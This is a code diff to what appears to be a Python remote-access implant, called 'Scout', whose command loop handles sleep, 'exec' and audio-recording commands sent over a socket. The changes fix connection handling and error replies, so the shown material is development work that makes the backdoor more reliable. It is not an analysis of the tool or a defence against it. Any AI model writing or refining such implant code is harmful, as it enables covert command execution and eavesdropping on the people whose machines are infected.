@@ -262,9 +262,9 @@ def main():
                         s.sendall('[-]Please specify an integer as the sleep duration' + End)
                         continue
                     s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
+                    s.shutdown(1)
+                    s.close()
                     for i in range(sleep_time):
-                        s.shutdown(1)
-                        s.close()
                         sleep(1)
                     break
                 elif command == 'exec':
@@ -318,7 +318,7 @@ def main():
                         seconds = int(data[1])
                         record_audio(seconds)
                     except (IndexError, TypeError):
-                        s.sendall('[-]Please supply an integer as the argument')
+                        s.sendall('[-]Please supply an integer as the argument' + End)
                 elif command == 'set_audio':
                     try:
                         level = int(data[1])
@@ -331,9 +331,9 @@ def main():
                 try:
                     s.shutdown(1)
                     s.close()
-                except:
-                    pass
-                break
+                    break
+                except socket.error:
+                    break
             except Exception as e:
                 try:
                     if command:
